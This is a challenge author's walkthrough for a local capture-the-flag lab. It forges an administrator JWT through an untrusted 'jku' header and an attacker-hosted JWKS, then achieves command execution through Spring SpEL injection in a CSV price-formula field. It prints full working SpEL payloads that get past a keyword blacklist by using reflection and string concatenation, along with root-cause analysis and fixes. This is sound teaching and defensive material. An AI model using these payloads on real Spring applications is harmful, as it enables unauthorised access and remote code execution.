# MarketNest CTF — Author Walkthrough

This is the complete mentor and author guide for the black-box challenge. It
contains the player solve path, working and failed payloads, source-code
references, root-cause analysis, and mitigation guidance. It is not intended
to be distributed to players as part of the challenge package.

## 1. Public briefing

MarketNest is a fictional B2B marketplace where retailers manage products, inventory, and orders. Administrators can bulk-import product catalogs using CSV files. The CSV contains a `priceFormula` field for formulas such as `basePrice * 0.9`.

The challenge contains two vulnerabilities:

1. The JWT verifier trusts the attacker-controlled `jku` header.
2. The pricing formula is evaluated using unrestricted Spring SpEL.

The goal is to move from a normal retailer account to administrator access, reach the hidden Pricing Studio, exploit the formula evaluator, and retrieve the flag from the native `flagbinary` executable.

## 2. Objective

The player must:

1. Create a normal account.
2. Forge an administrator JWT.
3. Access the hidden import functionality.
4. Prove that the formula field supports SpEL.
5. Bypass the weak blacklist.
6. Execute commands through Java reflection.
7. Discover and execute `/app/flagbinary`.
8. Read the flag through the computed-price column.

The import preview is the only feedback channel. The application displays the expression's return value in the `Computed price` cell.

## 3. Walkthrough

### Stage 1: Create an account

Open:

```text
http://localhost:8088/signup
```

Create an account and log in. The normal JWT contains values similar to:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "marketnest-main-key"
}
```

```json
{
  "iss": "marketnest",
  "sub": "your_username",
  "role": "retailer",
  "iat": 0,
  "exp": 0
}
```

The retailer can use the ordinary workspace, but `/import` redirects back to the dashboard.

### Stage 2: Exploit the JWT `jku` trust issue

The verifier reads the `jku` header and fetches the JWKS from that URL. It does not restrict the URL to a trusted host.

The player creates an RSA key pair:

- The private JWK stays in Burp JWT Editor.
- The public JWK is hosted locally in `jwks.json`.

Example public JWKS:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "n": "ATTACKER_PUBLIC_MODULUS",
      "e": "AQAB"
    }
  ]
}
```

For the local Docker setup, serve the file from the player host:

```powershell
python -m http.server 8000 --bind 0.0.0.0
```

The JWT uses:

```text
http://host.docker.internal:8000/jwks.json
```

`host.docker.internal` is required because `localhost` from inside the container refers to the container itself, not the Windows host.

The forged header is:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key",
  "jku": "http://host.docker.internal:8000/jwks.json"
}
```

The forged claims are:

```json
{
  "iss": "marketnest",
  "sub": "your_username",
  "role": "admin",
  "iat": 0,
  "exp": 0
}
```

The player signs the token with the matching private key and replaces the `pf_token` cookie in Burp Repeater. A successful request to `/dashboard` reveals **Pricing Studio**.

### Stage 3: Confirm formula evaluation

Upload:

```csv
name,basePrice,stock,priceFormula
Arithmetic Test,10,5,7*7
```

The computed result is `49.0`. This proves that the server evaluates the formula instead of storing it as text.

### Stage 4: Fingerprint SpEL

Try:

```csv
name,basePrice,stock,priceFormula
Method Test,1,1,"'abc'.length()"
```

The result is `3`. This shows that method calls are supported and the field is more powerful than a basic arithmetic parser.

Other reasonable black-box probes include:

```text
basePrice.toString()
''.getClass().getName()
```

The `${...}` syntax is not required because the application directly parses the formula as SpEL. It is not evaluating a template expression.

### Stage 5: Observe the blacklist

This direct payload is rejected:

```spel
T(java.lang.Runtime).getRuntime().exec('id')
```

The result is:

```text
ERROR: Formula rejected: blocked pattern 'runtime'
```

The blacklist only checks for literal substrings such as `runtime` and `processbuilder`.

### Stage 6: Bypass the blacklist

The blocked words can be constructed dynamically:

```spel
(''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('id')
```

The expression gets a Java class object, resolves `java.lang.Runtime` using `forName`, builds `Runtime` from string fragments, looks up `getRuntime` reflectively, invokes the static method, and executes the operating-system command.

The blacklist sees no contiguous `runtime` substring, but SpEL reconstructs the dangerous value while evaluating the expression.

### Stage 7: Understand the output channel

`Runtime.exec(...)` returns a `Process` object, not the command output.

The application only displays the expression's return value in the computed-price cell. Therefore the player must execute the process, obtain its stdout stream, wrap the stream in `Scanner`, and return the scanner's text as the final expression result.

The working form uses the public `java.lang.Process` class explicitly:

```spel
T(java.lang.Process).getMethod('getInputStream').invoke(process)
```

For example:

```csv
name,basePrice,stock,priceFormula
OutputTest,1,1,"new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('/usr/bin/echo hello'))).next()"
```

The result is `hello`.

The direct `.getInputStream()` form failed in this runtime because SpEL had trouble resolving the inherited method against the concrete `ProcessImpl` implementation. The command execution itself was working; only the output feedback path was failing.

### Stage 8: Discover the flag binary

Use a fresh import page and CSRF token, then upload:

```csv
name,basePrice,stock,priceFormula
Listing,1,1,"new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('/bin/ls -al'))).useDelimiter('\\A').next()"
```

The output should contain:

```text
flagbinary
```

The double backslash is needed so the Java regular expression receives `\A` and the scanner reads the complete stream as one token.

### Stage 9: Execute the flag binary

Upload:

```csv
name,basePrice,stock,priceFormula
Flag,1,1,"new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('./flagbinary'))).useDelimiter('\\A').next()"
```

The flag appears in the **Computed price** cell.

Each import consumes the one-time CSRF token, so the player must request a fresh `/import` page before each upload.

## 4. What happened and why

### JWT trust failure

The application verifies the signature mathematically, but it lets the token choose where the verification key comes from. This creates a trust failure:

```text
Attacker-controlled jku
    -> attacker-controlled JWKS
    -> attacker-controlled verification key
    -> valid signature on attacker-controlled claims
```

The server accepts the forged `role: admin` claim because it has no trusted issuer-key relationship.

### SpEL evaluation failure

The application uses:

```java
SpelExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext(product);
return parser.parseExpression(formula).getValue(context);
```

This permits method invocation, reflection, type access, constructors, and process execution. The application intended to support arithmetic, but it provided a general Java-oriented expression environment.

### Why the blacklist failed

The blacklist checks the raw text before parsing. It does not inspect the parsed expression tree or evaluated values. String concatenation defeats it:

```spel
'Run'+'time'
```

is not the same raw text as `runtime`, but evaluates to the same dangerous class or method name.

### Why Scanner was required

The import preview displays only the expression result. A `Process` object is not the command's stdout. `Scanner` converts the process input stream into a string that the application can display.

## 5. How to fix and mitigate

### Fix the JWT verifier

- Never trust an arbitrary user-controlled `jku` URL.
- Use a fixed server-side JWKS URL or a strict trusted-host allowlist.
- Pin allowed key IDs to trusted issuers.
- Validate `iss`, `aud`, `iat`, `nbf`, and `exp`.
- Do not accept an administrator role solely from an untrusted claim.
- Resolve authorization from trusted server-side identity data.

### Remove unrestricted SpEL

The safest fix is to replace SpEL with a dedicated arithmetic parser that supports only approved variables, operators, and functions.

If an expression engine is unavoidable:

- Use an allowlist of permitted syntax.
- Disable type access.
- Disable constructors.
- Disable method invocation.
- Disable reflection.
- Expose only approved variables.
- Validate the parsed expression tree before evaluation.

Do not attempt to secure a programming language with a keyword blacklist.

### Prevent process execution as defense in depth

- Run as a non-root user.
- Use a read-only filesystem.
- Drop Linux capabilities.
- Enable `no-new-privileges`.
- Restrict container networking.
- Remove unnecessary binaries.
- Apply seccomp/AppArmor policies.
- Keep secrets and executable helpers outside application directories.

These controls reduce impact but do not replace fixing the expression evaluation vulnerability.

### Improve error handling

Return a generic external message:

```text
Formula evaluation failed. Check the expression syntax.
```

Log detailed exception classes and stack traces only on the server. Raw Spring/Java errors can reveal implementation details and help attackers fingerprint the runtime.

### Preserve CSRF and session protections

- Bind CSRF tokens to the session.
- Make them one-time and expiring.
- Use `Secure`, `HttpOnly`, and `SameSite` cookies.
- Invalidate old sessions after authentication changes.

## 6. Complete attack chain

```text
Normal account
    -> normal retailer JWT
    -> unvalidated jku
    -> attacker-hosted JWKS
    -> forged admin JWT
    -> hidden Pricing Studio
    -> arithmetic evaluation
    -> method-call fingerprinting
    -> blacklist discovery
    -> reflective Runtime bypass
    -> process execution
    -> stdout extraction with Scanner
    -> flagbinary execution
    -> flag in computed-price cell
```

## 7. Final presentation summary

The challenge demonstrates two trust failures:

1. The JWT verifier trusted attacker-controlled key-location metadata.
2. The pricing service trusted attacker-controlled expression code.

Together they create this chain:

```text
Forged administrator identity + unrestricted SpEL = command execution
```

The key lessons are:

- Never trust arbitrary `jku` values.
- Never evaluate untrusted input with unrestricted SpEL.
- Do not rely on keyword blacklists.
- Use strict allowlists and restricted parsers.
- Treat error messages and output channels as part of the attack surface.

## 8. Source-code references for presentation

The links below are relative to this walkthrough file, so they can be opened directly from the project while presenting.

### JWT vulnerability: attacker-controlled `jku`

Source: [JwtService.java](src/main/java/com/priceforge/service/JwtService.java)

Important locations:

- Lines 31-32 define the trusted issuer and normal key ID.
- Lines 100-130 parse and verify the token.
- Line 113 reads the user-controlled `jku` header.
- Line 116 chooses between the server key and `fetchKey(jku, kid)`.
- Lines 147-165 fetch a JWKS from the supplied URL and select a matching key.
- Line 130 returns the JWT `sub` and `role` claims as the application identity.

Why it is vulnerable:

```java
String jku = header.path("jku").asText();
java.security.PublicKey verificationKey = jku.isBlank()
        ? serverKeyPair.getPublic()
        : fetchKey(jku, kid);
```

There is no trusted-host allowlist for `jku`. A player can host a JWKS, sign a token with the matching private key, and choose claims such as `role: admin`.

### Authorization gate: why the forged role matters

Source: [SessionFilter.java](src/main/java/com/priceforge/web/SessionFilter.java)

Important locations:

- Lines 31-37 identify protected routes.
- Lines 45-51 verify the JWT and attach the identity to the request.
- Lines 54-56 allow `/import` only when `identity.role()` is `admin`.

```java
if (path.startsWith("/import") && !"admin".equalsIgnoreCase(identity.role())) {
    response.sendRedirect("/dashboard");
    return;
}
```

The authorization check trusts the role returned by the vulnerable JWT verifier.

### SpEL injection: the direct cause of RCE

Source: [PricingService.java](src/main/java/com/priceforge/service/PricingService.java)

Important locations:

- Lines 30-33 define the weak substring blacklist.
- Line 35 creates a full `SpelExpressionParser`.
- Line 38 applies the blacklist.
- Line 40 creates `StandardEvaluationContext`.
- Line 41 parses attacker input as a SpEL expression.
- Line 42 evaluates the expression against the product.
- Lines 45-51 perform only a case-insensitive substring check.

Critical code:

```java
StandardEvaluationContext context = new StandardEvaluationContext(product);
Expression expression = parser.parseExpression(formula);
return expression.getValue(context);
```

Why it is vulnerable:

- `StandardEvaluationContext` supports powerful reflection and method resolution.
- The formula is not restricted to arithmetic.
- Type access, constructors, methods, and Java reflection remain available.
- The blacklist checks text, not the parsed expression tree.

### CSV processing and feedback channel

Source: [CsvImportService.java](src/main/java/com/priceforge/service/CsvImportService.java)

Important locations:

- Lines 28-44 read each CSV row and evaluate `priceFormula`.
- The computed expression result is stored in `ImportResult.computedValue`.
- The result is rendered in the import preview table.

```java
Object computed = pricingService.evaluate(formula, product);
result.setComputedValue(String.valueOf(computed));
```

`Runtime.exec(...)` returns a `Process` object, not command stdout. The player must obtain the process input stream, wrap it with `Scanner`, and return the text as the computed value.

The runtime-specific working form is:

```spel
T(java.lang.Process).getMethod('getInputStream').invoke(process)
```

This explicitly resolves the inherited method from public `java.lang.Process` instead of asking SpEL to resolve it against concrete `ProcessImpl`.

### Import endpoint and CSRF behavior

Source: [ImportController.java](src/main/java/com/priceforge/web/ImportController.java)

Important locations:

- Lines 28-33 render the import page and create a CSRF token.
- Lines 35-47 receive the multipart upload.
- Line 40 consumes the one-time CSRF token.
- Line 46 invokes `CsvImportService.processFile(file)`.

This explains why players must request a fresh `/import` page before each upload.

### Native flag helper and container restrictions

Sources:

- [priceforge_flag.c](src/main/c/priceforge_flag.c)
- [Dockerfile](Dockerfile)
- [compose.yaml](compose.yaml)

The Docker build compiles the native helper into `/app/flagbinary`. The runtime container is deliberately restricted with a read-only filesystem, dropped capabilities, and `no-new-privileges`. These controls prevent modification of the helper while still allowing the intended challenge path to execute it.

